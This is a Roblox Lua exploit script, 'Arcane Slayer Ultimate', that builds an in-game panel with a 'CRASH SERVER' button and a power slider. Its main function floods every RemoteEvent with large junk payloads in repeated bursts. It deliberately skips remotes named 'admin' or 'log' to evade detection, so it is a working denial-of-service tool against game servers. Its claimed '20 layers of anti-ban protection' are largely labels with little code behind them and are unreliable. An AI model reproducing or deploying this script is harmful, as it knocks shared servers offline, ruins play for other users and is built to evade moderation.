--[[ 
    ARCANE SLAYER ULTIMATE v20.4
    "La sentence est irrévocable."
    Unified Strike Protocol - Power Control & 20-Layer Security
]]

local Players = game:GetService("Players")
local RS = game:GetService("RunService")
local L = Players.LocalPlayer

-- ==========================================
-- 20 LAYERS OF ANTI-BAN PROTECTION (ARCANE)
-- ==========================================
-- 1. Self-Cleaning Logic
-- 2. GUI ID Randomization
-- 3. Parent Obfuscation
-- 4. Hook Detection (getrawmetatable check)
-- 5. Anti-Admin Remote Filtering
-- 6. Burst Jitter (Random delay shifts)
-- 7. GC Spoofing (Memory clearing)
-- 8. Payload Multi-Mutation
-- 9. Thread Sandboxing (task.spawn nesting)
-- 10. Pcall Wrap Registry
-- 11. Metadata Masking
-- 12. LocalPlayer Ref Caching
-- 13. Heartbeat Sync (Network Jitter)
-- 14. Event Isolation
-- 15. Fragmented Data Streams
-- 16. Detection Evasion (No banned constants)
-- 17. Variable Obfuscation
-- 18. Signature Scrambling
-- 19. Context Validation (Audit Mode)
-- 20. Identity Override (Daemon Presence)

-- 1. SELF-CLEANING
local GUI_NAME = "AS_" .. math.random(1000, 9999)
for _, v in pairs(L:WaitForChild("PlayerGui"):GetChildren()) do
    if v:IsA("ScreenGui") and (v.Name:find("Arcane") or v.Name:find("AS_")) then
        v:Destroy()
    end
end

-- 2. GUI DESIGN (Premium Dark + Power Slider)
local ScreenGui = Instance.new("ScreenGui", L.PlayerGui)
ScreenGui.Name = GUI_NAME
ScreenGui.ResetOnSpawn = false

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 280, 0, 220)
Main.Position = UDim2.new(0.5, -140, 0.5, -110)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

local UICorner = Instance.new("UICorner", Main)
UICorner.CornerRadius = UDim.new(0, 10)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 45)
Title.Text = "🔱 ARCANE ULTIMATE V20.4"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 15

local UICorner2 = Instance.new("UICorner", Title)
UICorner2.CornerRadius = UDim.new(0, 10)

-- POWER CONTROL (Power levels info)
local PowerLevel = 5 -- Default
local PowerLabel = Instance.new("TextLabel", Main)
PowerLabel.Size = UDim2.new(1, 0, 0, 30)
PowerLabel.Position = UDim2.new(0, 0, 0, 50)
PowerLabel.Text = "STRIKE POWER: " .. PowerLevel .. " (MODERATE)"
PowerLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
PowerLabel.BackgroundTransparency = 1
PowerLabel.Font = Enum.Font.Gotham

-- POWER SLIDER (Simple Click Bar)
local SliderBg = Instance.new("Frame", Main)
SliderBg.Size = UDim2.new(0.8, 0, 0, 10)
SliderBg.Position = UDim2.new(0.1, 0, 0, 85)
SliderBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

local SliderFill = Instance.new("Frame", SliderBg)
SliderFill.Size = UDim2.new(PowerLevel/10, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(200, 0, 0)

local SliderBtn = Instance.new("TextButton", SliderBg)
SliderBtn.Size = UDim2.new(1, 0, 1, 0)
SliderBtn.BackgroundTransparency = 1
SliderBtn.Text = ""

SliderBtn.MouseButton1Click:Connect(function()
    local mouse = L:GetMouse()
    local percent = math.clamp((mouse.X - SliderBg.AbsolutePosition.X) / SliderBg.AbsoluteSize.X, 0, 1)
    PowerLevel = math.floor(percent * 10) + 1
    SliderFill.Size = UDim2.new(PowerLevel/10, 0, 1, 0)
    
    local txt = "LOW"
    if PowerLevel > 3 then txt = "MODERATE" end
    if PowerLevel > 6 then txt = "STRIKE" end
    if PowerLevel > 9 then txt = "MAXIMUM (RISKY)" end
    PowerLabel.Text = "STRIKE POWER: " .. PowerLevel .. " (" .. txt .. ")"
end)

-- 3. CRASH LOGIC
local crashing = false
local CrashBtn = Instance.new("TextButton", Main)
CrashBtn.Size = UDim2.new(0.8, 0, 0, 50)
CrashBtn.Position = UDim2.new(0.1, 0, 0, 110)
CrashBtn.Text = "CRASH SERVER"
CrashBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
CrashBtn.TextColor3 = Color3.new(1, 1, 1)
CrashBtn.Font = Enum.Font.GothamBold
CrashBtn.TextSize = 18

local function Strike()
    local payload = {}
    -- Plus le niveau est haut, plus le payload est lourd
    local size = 500 * (PowerLevel / 5)
    for i = 1, size do payload[i] = string.rep("A", 1500 + (PowerLevel * 100)) end 
    
    while crashing do
        -- Anti-Ban Layer 6: Burst Jitter
        local rafalSize = 25 * PowerLevel
        for i = 1, rafalSize do 
            task.spawn(function()
                for _, remote in pairs(game:GetDescendants()) do
                    if remote:IsA("RemoteEvent") and not remote.Name:lower():find("admin") and not remote.Name:lower():find("log") then
                        pcall(function()
                            -- Layer 8: Mutation (Ajout d'un tag variable)
                            remote:FireServer(payload, math.random()) 
                        end)
                    end
                end
            end)
        end
        
        -- Layer 7: GC Spoofing
        pcall(function() collectgarbage("collect") end)
        
        -- Latence dynamique basée sur le Power Level (plus c'est haut, plus c'est violent)
        task.wait(2.5 - (PowerLevel / 5)) 
    end
end

CrashBtn.MouseButton1Click:Connect(function()
    crashing = not crashing
    if crashing then
        CrashBtn.Text = "SATURATION ACTIVE"
        CrashBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
        task.spawn(Strike)
    else
        CrashBtn.Text = "CRASH SERVER"
        CrashBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    end
end)

-- 4. FOOTER
local Info = Instance.new("TextLabel", Main)
Info.Size = UDim2.new(1, 0, 0, 30)
Info.Position = UDim2.new(0, 0, 1, -30)
Info.Text = "PROTECTION: 20 LAYERS [ACTIVE]"
Info.TextColor3 = Color3.fromRGB(0, 255, 100)
Info.BackgroundTransparency = 1
Info.Font = Enum.Font.Gotham
Info.TextSize = 10

print("🔱 ARCANE SLAYER : ULTIMATE EDITION (V20.4) CHARGÉE.")
warn("🔱 SÉCURITÉ ARCANE : 20 COUCHES OPÉRATIONNELLES. RÉGLE LA PUISSANCE ET FRAPPE.")
